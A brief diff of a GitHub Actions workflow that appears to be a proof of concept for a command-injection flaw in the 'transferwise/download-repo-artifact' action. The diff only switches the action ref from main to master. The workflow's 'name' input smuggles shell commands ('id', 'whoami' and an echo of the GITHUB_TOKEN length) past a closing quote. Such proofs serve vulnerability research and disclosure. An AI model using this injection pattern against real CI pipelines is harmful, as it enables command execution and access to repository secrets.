@@ -6,7 +6,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Call vulnerable action with injected input
-        uses: transferwise/download-repo-artifact@main
+        uses: transferwise/download-repo-artifact@master
         with:
           name: 'x" || true; id; whoami; echo "TOKEN_LENGTH=${#GITHUB_TOKEN}'
           path: '.'
